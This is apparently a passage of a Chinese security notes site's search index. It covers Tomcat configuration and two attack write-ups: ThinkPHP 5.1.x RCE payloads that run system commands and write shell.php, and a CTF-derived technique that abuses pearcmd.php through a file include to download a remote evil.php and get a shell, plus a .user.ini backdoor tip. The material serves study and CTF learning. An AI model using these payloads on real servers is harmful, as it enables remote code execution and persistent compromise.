\u76d1\u542c\u5730\u5740\u914d\u7f6e # \u4fee\u6539name\u5373\u53ef\uff0c\u9ed8\u8ba4\u662flocalhost\uff0c\u53ea\u80fd\u7531\u672c\u5730\u8bbf\u95ee\uff0c\u8fd9\u4e2aname\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u57df\u540d\uff0c\u670d\u52a1\u5668\u542f\u52a8\u65f6\u4f1a\u4f18\u5148\u4ecehosts\u6587\u4ef6\u4e2d\u5bfb\u627e\u8fd9\u4e2a\u57df\u540d\u5e76\u6307\u5411\u5bf9\u5e94\u7684\u5730\u5740(\u5176\u5b9elocalhost\u4e5f\u662f\u8fd9\u4e2a\u9053\u7406\uff0c\u5728hosts\u4e2d\u76f4\u63a5\u6307\u5411\u4e86127.0.0.1\uff0c\u6240\u4ee5\u8fd9\u91ccname\u4e3alocalhost\u548cname\u4e3a127.0.0.1\u662f\u4e00\u6837\u7684) <Host name= \"localhost\" appBase= \"webapps\" unpackWARs= \"true\" autoDeploy= \"true\" > \u76d1\u542c\u7aef\u53e3\u914d\u7f6e # \u4fee\u6539port\u7aef\u53e3\u5373\u53ef\uff0c\u9ed8\u8ba4\u662f8080 <Connector port= \"8080\" protocol= \"HTTP/1.1\" connectionTimeout= \"20000\" redirectPort= \"8443\" /> web\u76ee\u5f55\u914d\u7f6e # \u4fee\u6539appBase\u5373\u53ef\uff0c\u9ed8\u8ba4\u662f\u5f53\u524d\u76ee\u5f55\u4e0b\u7684webapps\u76ee\u5f55 <Host name= \"localhost\" appBase= \"webapps\" unpackWARs= \"true\" autoDeploy= \"true\" > \u7f16\u5199web\u9875\u9762 # web\u76ee\u5f55\u9ed8\u8ba4\u5728webapps\u4e0b\uff0cROOT\u662f\u9ed8\u8ba4\u7684\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\uff0c\u5176\u4ed6\u7684\u6587\u4ef6\u5939\u5bf9\u5e94\u7684\u5c31\u662f\u8bbf\u95ee\u7684\u8def\u5f84\uff0c\u4f8b\u5982examples\u6587\u4ef6\u5939\u4e0b\u7684\u5185\u5bb9\u9700\u8981\u901a\u8fc7 http://127.0.0.1:8080/examples/ \u8bbf\u95ee\u3002 \u6211\u4eec\u53ef\u4ee5\u5728webapps\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u5199\u5165index.html(\u9ed8\u8ba4\u6253\u5f00\u7684\u9875\u9762)\uff0c\u542f\u52a8Tomcat\u670d\u52a1\u5668\u540e\u8bbf\u95ee\u5373\u53ef\u3002 \u6216\u8005\u6211\u4eec\u53ef\u4ee5\u53c2\u8003webapps/examples\u4e0b\u7684\u5185\u5bb9\u8fdb\u884c\u5b66\u4e60\uff0c\u91cc\u9762\u6709\u5f88\u591a\u5b98\u65b9\u7684\u4f8b\u5b50\u3002 IDEA\u4e2d\u4f7f\u7528Tomcat # \u521b\u5efaweb\u9879\u76ee # \u914d\u7f6eTomcat # \u70b9\u51fb\u53f3\u4e0a\u89d2\u7684ADD CONFIGURATION\u6dfb\u52a0\u914d\u7f6e \u70b9\u51fb\u5de6\u4e0a\u89d2\u7684\u52a0\u53f7\u5e76\u9009\u62e9Tomcat Server - Local \u7136\u540e\u53ef\u4ee5\u5bf9Tomcat\u8fdb\u884c\u4e00\u4e9b\u914d\u7f6e \u8fd8\u8981\u518dDeployment\u4e2d\u6dfb\u52a0artifacts\uff0c\u8fd9\u91ccApplication Context\u662f\u4e00\u4e2a\u8def\u5f84\u6620\u5c04\uff0c\u9ed8\u8ba4\u4e3a/\uff0c\u5373\u8bbf\u95ee http://127.0.0.1:8080/ \uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a\u5176\u4ed6\u5185\u5bb9\u5982/test\uff0c\u5219\u8bbf\u95ee http://127.0.0.1:8080/test \u914d\u7f6e\u5b8c\u4e4b\u540e\u6574\u4e2a\u9879\u76ee\u7ed3\u6784\u5927\u6982\u662f\u8fd9\u6837 \u6700\u540e\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684\u7eff\u8272\u8fd0\u884c\u7bad\u5934\u5373\u53ef","title":"Tomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#tomcat","text":"tomcat\u5b98\u7f51","title":"Tomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u5b89\u88c5tomcat","text":"\u76f4\u63a5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u7136\u540e\u5b89\u88c5\uff0c\u6216\u8005\u4f7f\u7528\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\u3002","title":"\u5b89\u88c5tomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u542f\u52a8\u5173\u95edtomcat","text":"\u5728Tomcat/bin\u76ee\u5f55\u4e2d\u6709startup.sh/startup.bat\u811a\u672c\u7528\u4e8e\u542f\u52a8Tomcat\uff0cTomcat\u542f\u52a8\u540e\u9ed8\u8ba4\u5f00\u542f\u5728 http://127.0.0.1:8080 \u5728Tomcat/bin\u76ee\u5f55\u4e2d\u6709shutdown.sh/shutdown.bat\u811a\u672c\u7528\u4e8e\u5173\u95edTomcat","title":"\u542f\u52a8\uff0c\u5173\u95edTomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#tomcat\u914d\u7f6e","text":"","title":"Tomcat\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u76d1\u542c\u5730\u5740\u914d\u7f6e","text":"\u4fee\u6539name\u5373\u53ef\uff0c\u9ed8\u8ba4\u662flocalhost\uff0c\u53ea\u80fd\u7531\u672c\u5730\u8bbf\u95ee\uff0c\u8fd9\u4e2aname\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u57df\u540d\uff0c\u670d\u52a1\u5668\u542f\u52a8\u65f6\u4f1a\u4f18\u5148\u4ecehosts\u6587\u4ef6\u4e2d\u5bfb\u627e\u8fd9\u4e2a\u57df\u540d\u5e76\u6307\u5411\u5bf9\u5e94\u7684\u5730\u5740(\u5176\u5b9elocalhost\u4e5f\u662f\u8fd9\u4e2a\u9053\u7406\uff0c\u5728hosts\u4e2d\u76f4\u63a5\u6307\u5411\u4e86127.0.0.1\uff0c\u6240\u4ee5\u8fd9\u91ccname\u4e3alocalhost\u548cname\u4e3a127.0.0.1\u662f\u4e00\u6837\u7684) <Host name= \"localhost\" appBase= \"webapps\" unpackWARs= \"true\" autoDeploy= \"true\" >","title":"\u76d1\u542c\u5730\u5740\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u76d1\u542c\u7aef\u53e3\u914d\u7f6e","text":"\u4fee\u6539port\u7aef\u53e3\u5373\u53ef\uff0c\u9ed8\u8ba4\u662f8080 <Connector port= \"8080\" protocol= \"HTTP/1.1\" connectionTimeout= \"20000\" redirectPort= \"8443\" />","title":"\u76d1\u542c\u7aef\u53e3\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#web\u76ee\u5f55\u914d\u7f6e","text":"\u4fee\u6539appBase\u5373\u53ef\uff0c\u9ed8\u8ba4\u662f\u5f53\u524d\u76ee\u5f55\u4e0b\u7684webapps\u76ee\u5f55 <Host name= \"localhost\" appBase= \"webapps\" unpackWARs= \"true\" autoDeploy= \"true\" >","title":"web\u76ee\u5f55\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u7f16\u5199web\u9875\u9762","text":"web\u76ee\u5f55\u9ed8\u8ba4\u5728webapps\u4e0b\uff0cROOT\u662f\u9ed8\u8ba4\u7684\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\uff0c\u5176\u4ed6\u7684\u6587\u4ef6\u5939\u5bf9\u5e94\u7684\u5c31\u662f\u8bbf\u95ee\u7684\u8def\u5f84\uff0c\u4f8b\u5982examples\u6587\u4ef6\u5939\u4e0b\u7684\u5185\u5bb9\u9700\u8981\u901a\u8fc7 http://127.0.0.1:8080/examples/ \u8bbf\u95ee\u3002 \u6211\u4eec\u53ef\u4ee5\u5728webapps\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u5199\u5165index.html(\u9ed8\u8ba4\u6253\u5f00\u7684\u9875\u9762)\uff0c\u542f\u52a8Tomcat\u670d\u52a1\u5668\u540e\u8bbf\u95ee\u5373\u53ef\u3002 \u6216\u8005\u6211\u4eec\u53ef\u4ee5\u53c2\u8003webapps/examples\u4e0b\u7684\u5185\u5bb9\u8fdb\u884c\u5b66\u4e60\uff0c\u91cc\u9762\u6709\u5f88\u591a\u5b98\u65b9\u7684\u4f8b\u5b50\u3002","title":"\u7f16\u5199web\u9875\u9762"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#idea\u4e2d\u4f7f\u7528tomcat","text":"","title":"IDEA\u4e2d\u4f7f\u7528Tomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u521b\u5efaweb\u9879\u76ee","text":"","title":"\u521b\u5efaweb\u9879\u76ee"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u914d\u7f6etomcat","text":"\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684ADD CONFIGURATION\u6dfb\u52a0\u914d\u7f6e \u70b9\u51fb\u5de6\u4e0a\u89d2\u7684\u52a0\u53f7\u5e76\u9009\u62e9Tomcat Server - Local \u7136\u540e\u53ef\u4ee5\u5bf9Tomcat\u8fdb\u884c\u4e00\u4e9b\u914d\u7f6e \u8fd8\u8981\u518dDeployment\u4e2d\u6dfb\u52a0artifacts\uff0c\u8fd9\u91ccApplication Context\u662f\u4e00\u4e2a\u8def\u5f84\u6620\u5c04\uff0c\u9ed8\u8ba4\u4e3a/\uff0c\u5373\u8bbf\u95ee http://127.0.0.1:8080/ \uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a\u5176\u4ed6\u5185\u5bb9\u5982/test\uff0c\u5219\u8bbf\u95ee http://127.0.0.1:8080/test \u914d\u7f6e\u5b8c\u4e4b\u540e\u6574\u4e2a\u9879\u76ee\u7ed3\u6784\u5927\u6982\u662f\u8fd9\u6837 \u6700\u540e\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684\u7eff\u8272\u8fd0\u884c\u7bad\u5934\u5373\u53ef","title":"\u914d\u7f6eTomcat"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/","text":"thinkphp 5.1.x RCE # \u53c2\u8003\u6587\u7ae0 # https://xz.aliyun.com/t/9369 RCE1 # \u6839\u672c\u539f\u56e0 # thinkphp\u6ca1\u6709\u5bf9\u7528\u6237\u4f20\u5165\u7684\u64cd\u4f5c\u5668\u540d\u79f0\u8fdb\u884c\u8fc7\u6ee4,\u5bfc\u81f4\u53ef\u4ee5\u8c03\u7528\u9876\u90e8\u7c7b\u4e2d\u7684\u65b9\u6cd5,\u9020\u6210\u4e00\u7cfb\u5217\u7684\u5371\u5bb3 \u5f71\u54cd\u7248\u672c # TP5.1.0-5.1.30 payload # ?s=index/\\think\\Request/input&filter[]=system&data=pwd ?s=index/\\think\\view\\driver\\Php/display&content= <?php phpinfo (); ?> #\u6ce8\u610f\u7531\u4e8ewindows\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u539f\u56e0\u6240\u4ee5\u8fd9\u4e2apayload\u5728windows\u4e0b\u65e0\u6cd5\u4f7f\u7528 ?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content= <?php phpinfo (); ?> ?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id ?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id \u5206\u6790 #","title":"thinkphp 5.1.x RCE"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#thinkphp-51x-rce","text":"","title":"thinkphp 5.1.x RCE"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u53c2\u8003\u6587\u7ae0","text":"https://xz.aliyun.com/t/9369","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#rce1","text":"","title":"RCE1"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u6839\u672c\u539f\u56e0","text":"thinkphp\u6ca1\u6709\u5bf9\u7528\u6237\u4f20\u5165\u7684\u64cd\u4f5c\u5668\u540d\u79f0\u8fdb\u884c\u8fc7\u6ee4,\u5bfc\u81f4\u53ef\u4ee5\u8c03\u7528\u9876\u90e8\u7c7b\u4e2d\u7684\u65b9\u6cd5,\u9020\u6210\u4e00\u7cfb\u5217\u7684\u5371\u5bb3","title":"\u6839\u672c\u539f\u56e0"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u5f71\u54cd\u7248\u672c","text":"TP5.1.0-5.1.30","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#payload","text":"?s=index/\\think\\Request/input&filter[]=system&data=pwd ?s=index/\\think\\view\\driver\\Php/display&content= <?php phpinfo (); ?> #\u6ce8\u610f\u7531\u4e8ewindows\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u539f\u56e0\u6240\u4ee5\u8fd9\u4e2apayload\u5728windows\u4e0b\u65e0\u6cd5\u4f7f\u7528 ?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content= <?php phpinfo (); ?> ?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id ?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id","title":"payload"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u5206\u6790","text":"","title":"\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/","text":"register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3 # \u5f15\u5b50\u662f\u5dc5\u5cf0\u6781\u5ba22020\u7684 Meow World ,\u9898\u76ee\u603b\u7ed3\u4e0b\u6765\u53ea\u6709\u4e00\u53e5\u8bdd: <?php include $_GET [ 'f' ] . \".php\" ; \u771f\u7684\u662f\u5f00\u5c40\u4e00\u4e2ainclude,getshell\u5168\u9760\u731c,\u6bd4\u8d5b\u65f6\u63d0\u793aregister argc argv,\u4f46\u6ca1\u505a\u51fa\u6765,\u8d5b\u540e\u770b\u4e86\u522b\u4eba\u7684wp\u548c\u603b\u7ed3,\u81ea\u5df1\u4e5f\u6253\u7b97\u5199\u4e00\u4e2a\u5c0f\u7ed3. register argc argv # \u9996\u5148\u4e86\u89e3\u5230\u8fd9\u4e2a\u53c2\u6570\u9ed8\u8ba4\u662fOn\u7684: \u4f46\u662f\u7ecf\u8fc7\u540e\u6765\u6d4b\u8bd5\u53d1\u73b0\u4f46\u51e1\u914d\u7f6e\u4e86php.ini\u7684php\u91cc\u90fd\u4f1a\u663e\u793a\u58f0\u660e\u8be5\u53c2\u6570\u4e3aOff,\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u505a\u4ec0\u4e48\u7684\u5462? \u8fd9\u91cc\u4ecb\u7ecd\u4e86register argc argv\u7684\u4f5c\u7528,\u5f53\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u7684\u65f6\u5019,php\u4f1a\u6ce8\u518cargc\u548cargv\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf,\u5e76\u4e14\u901a\u8fc7\u7b2c\u4e8c\u4e2a\u56fe\u53ef\u77e5\u6211\u4eec\u53ef\u4ee5\u4ece$_SERVER['argv'] \u4e2d\u83b7\u53d6\u5230\u8fd9\u4e9b\u503c. \u8fd9\u91cc\u5c31\u8981\u77e5\u9053php\u4f5c\u4e3a\u4e00\u79cd\u811a\u672c\u8bed\u8a00,\u5f53\u7136\u53ef\u4ee5\u7528\u4e8e\u7f16\u5199\u547d\u4ee4\u884c\u811a\u672c,\u800c\u6211\u4eec\u53ef\u4ee5\u5728\u811a\u672c\u4e2d\u76f4\u63a5\u8bbf\u95ee argv , argv , argc \u8fd9\u4e24\u4e2a\u5168\u5c40\u53d8\u91cf. \u8fd9\u91cc\u5b9e\u9645\u6d4b\u8bd5\u4e0b\u8f7dregister argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b _SERVER['argv']\u4e0e _SERVER['argv']\u4e0e argv\u7684\u503c: <?php var_dump ( $_SERVER [ 'argv' ]); var_Dump ( $argv ); \u7f51\u9875\u7aef\u4e2d: \u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b: \u800c\u5728register argc argv\u5173\u95ed\u7684\u60c5\u51b5\u4e0b,$_SERVER['argv']\u4e0d\u4f1a\u62ff\u5230\u4efb\u4f55\u53d6\u503c pear # \u63a5\u4e0b\u6765\u5c31\u8981\u4ecb\u7ecdpear\u8fd9\u4e2a\u547d\u4ee4,\u7b80\u4ecb\u5982\u4e0b: pear # Pear \u662f PHP \u6269\u5c55\u4e0e\u5e94\u7528\u5e93\uff08the PHP Extension and Application Repository\uff09\u7684\u7f29\u5199\uff0c\u662f\u4e00\u4e2a PHP \u6269\u5c55\u53ca\u5e94\u7528\u7684\u4e00\u4e2a\u4ee3\u7801\u4ed3\u5e93\u3002Pear \u4ed3\u5e93\u4ee3\u7801\u662f\u4ee5\u5305\uff08package\uff09\u5206\u533a\uff0c\u6bcf\u4e00\u4e2a Pear package \u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u9879\u76ee\u6709\u7740\u81ea\u5df1\u72ec\u7acb\u7684\u5f00\u53d1\u56e2\u961f\u3001\u7248\u672c\u63a7\u5236\u3001\u6587\u6863\u548c\u5176\u4ed6\u5305\u7684\u4f9d\u8d56\u5173\u7cfb\u4fe1\u606f\u3002Pear package \u4ee5 phar\u3001tar \u6216 zip \u53d1\u5e03\u3002 \u65e2\u7136\u662f\u4e2a\u5305\u7ba1\u7406\u5668,\u90a3\u4e48\u5c31\u5e94\u8be5\u5b58\u5728\u4e0b\u8f7d\u548c\u5b89\u88c5\u5305\u7684\u529f\u80fd,\u90a3\u4e48pear\u547d\u4ee4\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462? \u5b9e\u9645\u4e0apear\u547d\u4ee4\u662fsh\u811a\u672c,\u6e90\u7801\u5982\u4e0b: #!/bin/sh # first find which PHP binary to use if test \"x $PHP_PEAR_PHP_BIN \" ! = \"x\" ; then PHP = \" $PHP_PEAR_PHP_BIN \" else if test \"/usr/local/bin/php\" = '@' php_bin '@' ; then PHP = php else PHP = \"/usr/local/bin/php\" fi fi # then look for the right pear include dir if test \"x $PHP_PEAR_INSTALL_DIR \" ! = \"x\" ; then INCDIR = $PHP_PEAR_INSTALL_DIR INCARG = \"-d include_path= $PHP_PEAR_INSTALL_DIR \" else if test \"/usr/local/lib/php\" = '@' php_dir '@' ; then INCDIR = ` dirname $0 ` INCARG = \"\" else INCDIR = \"/usr/local/lib/php\" INCARG = \"-d include_path=/usr/local/lib/php\" fi fi exec $PHP -C -q $INCARG -d date.timezone = UTC -d output_buffering = 1 -d variables_order = EGPCS -d open_basedir = \"\" -d safe_mode = 0 -d register_argc_argv = \"On\" -d auto_prepend_file = \"\" -d auto_append_file = \"\" $INCDIR /pearcmd.php \" $@ \" \u901a\u8fc7\u770b\u6700\u540e\u4e00\u884c\u53ef\u4ee5\u77e5\u9053\u5176\u5b9e\u5b83\u662f\u901a\u8fc7php\u8c03\u7528\u4e86pearcmd.php,\u90a3\u4e48pearcmd.php\u4e2d$argv\u662f\u4ece\u54ea\u91cc\u6765\u7684\u5462,\u901a\u8fc7\u7b80\u5355\u67e5\u627e\u53ef\u4ee5\u770b\u5230\u5176\u8c03\u7528\u4e86\u53e6\u4e00\u4e2aphp\u6587\u4ef6\u4e2d\u67d0\u4e2a\u7c7b\u65b9\u6cd5: require_once 'Console/Getopt.php'; /* ... */ $argv = Console_Getopt::readPHPArgv(); \u518d\u6b21\u8ddf\u8fdbConsole/Getopt.php,\u627e\u5230\u8be5\u65b9\u6cd5\u7684\u5b9e\u73b0: public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } \u53ef\u4ee5\u770b\u5230\u83b7\u53d6$argv\u7684\u65b9\u5f0f\u662f global $argv --> $_SERVER['argv'] --> $GLOBALS['HTTP_SERVER_VARS']['argv'] \u540c\u65f6\u6211\u4eec\u77e5\u9053\u5f53\u6211\u4eecinclude\u4e00\u4e2a\u53ef\u4ee5\u88abphp\u89e3\u6790\u7684\u6587\u4ef6\u7684\u65f6\u5019,php\u4ee3\u7801\u4f1a\u88ab\u81ea\u52a8\u6267\u884c,\u8fd9\u6837\u5728register argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u5305\u542bpearcmd.php\u4e0e\u64cd\u63a7$_SERVER['argv']\u6765\u6267\u884cpear\u547d\u4ee4 pear\u547d\u4ee4\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d # \u6211\u4eec\u5148\u6765\u770b\u770b\u5982\u4f55\u901a\u8fc7pear\u547d\u4ee4\u6765\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d: \u5728\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2atmp.php \u4f7f\u7528python\u4e00\u53e5\u8bdd\u5f00\u542fhttp\u670d\u52a1\u5668: python -m SimpleHTTPServer 8080 \u901a\u8fc7\u6267\u884c pear \u547d\u4ee4\u83b7\u53d6\u5e2e\u52a9,\u53d1\u73b0\u5b58\u5728download\u9009\u9879,\u5c1d\u8bd5\u6267\u884c pear download http://127.0.0.1:8080/tmp.php ,\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u6210\u529f\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u8f7d\u4e86tmp.php: \u6709\u6ca1\u6709\u529e\u6cd5\u63a7\u5236\u4e0b\u8f7d\u76ee\u5f55?\u7b54\u6848\u662f\u4f7f\u7528install -R\u800c\u975edownload,\u5c1d\u8bd5\u6267\u884c pear install -R /var/www/html http://127.0.0.1:8080/tmp.php \u6210\u529f\u4e0b\u8f7d\u5230web\u76ee\u5f55\u4e0b\u5e76\u80fd\u591f\u8bbf\u95ee \u5982\u4f55\u63a7\u5236$_SERVER['argv'] # \u5982\u4f55\u5f80$_SERVER['argv']\u4f20\u51652\u4e2a\u6216\u4ee5\u4e0a\u7684\u53c2\u6570?\u6d4b\u8bd5\u4e00\u4e0b: \u5e76\u4e0d\u80fd\u901a\u8fc7&\u4f5c\u4e3a$_SERVER['argv']\u7684\u5206\u5272,\u901a\u8fc7\u67e5\u9605\u8d44\u6599\u548c\u9605\u8bfb\u6e90\u7801: main/php_variables.c PHPAPI void php_build_argv ( const char * s , zval * track_vars_array ) { zval arr , argc , tmp ; int count = 0 ; if ( ! ( SG ( request_info ). argc || track_vars_array )) { return ; } array_init ( & arr ); /* Prepare argv */ if ( SG ( request_info ). argc ) { /* are we in cli sapi? */ int i ; for ( i = 0 ; i < SG ( request_info ). argc ; i ++ ) { ZVAL_STRING ( & tmp , SG ( request_info ). argv [ i ]); if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } } } else if ( s && * s ) { while ( 1 ) { const char * space = strchr ( s , '+' ); /* auto-type */ ZVAL_STRINGL ( & tmp , s , space ? space - s : strlen ( s )); count ++ ; if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } if ( ! space ) { break ; } s = space + 1 ; } } \u53ef\u4ee5\u77e5\u9053argv\u901a\u8fc7query_string\u53d6\u503c,\u5e76\u901a\u8fc7+\u4f5c\u4e3a\u5206\u5272\u7b26,\u5c1d\u8bd5\u4e00\u4e0b: \u56de\u5230\u9898\u76ee # \u73b0\u5728\u56de\u5230\u9898\u76ee,\u6211\u4eec\u6240\u6709\u7684\u62fc\u56fe\u5df2\u7ecf\u51d1\u9f50\u4e86,\u5047\u5982\u5b58\u5728\u4ee5\u4e0b\u73af\u5883: \u5b89\u88c5\u4e86pear \u5f00\u542f\u4e86register argc argv \u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662f include $_GET['f'].php ) \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u77e5\u8bc6\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u4ece\u800cgetshell: // web\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil \u540e\u95e8 # \u524d\u9762\u63d0\u5230register argc argv\u662fPHP INI PERDIR\u7684,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u65b0\u5efa\u4e00\u4e2a.user.ini\u8bbe\u7f6eregister argc argv\u4e3aOn\u7528\u4e8e\u7559\u540e\u95e8 \u6700\u540e:docker # \u5728php\u5b98\u65b9\u63d0\u4f9b\u7684\u955c\u50cf\u4e0b,\u9ed8\u8ba4\u662f\u4e0d\u4f7f\u7528php.ini\u7684(\u5728/usr/local/etc/php\u4e2d\u5b58\u5728php.ini-production\u548cphp.ini-development,\u9700\u8981\u624b\u52a8\u4fee\u6539\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u540d\u4e3aphp.ini\u624d\u4f1a\u542f\u52a8php.ini,\u800c\u4e0a\u9762\u6211\u4eec\u63d0\u5230\u5728php.ini\u4e2dregister argc argv\u90fd\u8bbe\u7f6e\u4e3aOff) \u800cregister argc argv\u5728\u4e0d\u8bbe\u7f6e\u7684\u60c5\u51b5\u4e0b\u9ed8\u8ba4\u4e3aOn,\u90a3\u4e48\u5047\u5982\u6709\u4e00\u4e2a\u9ed8\u8ba4\u7684docker-php\u73af\u5883,\u5e76\u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662finclude $_GET['f'].php),\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u5b9e\u73b0getshell","title":"register_argc_argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#registerargcargv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3","text":"\u5f15\u5b50\u662f\u5dc5\u5cf0\u6781\u5ba22020\u7684 Meow World ,\u9898\u76ee\u603b\u7ed3\u4e0b\u6765\u53ea\u6709\u4e00\u53e5\u8bdd: <?php include $_GET [ 'f' ] . \".php\" ; \u771f\u7684\u662f\u5f00\u5c40\u4e00\u4e2ainclude,getshell\u5168\u9760\u731c,\u6bd4\u8d5b\u65f6\u63d0\u793aregister argc 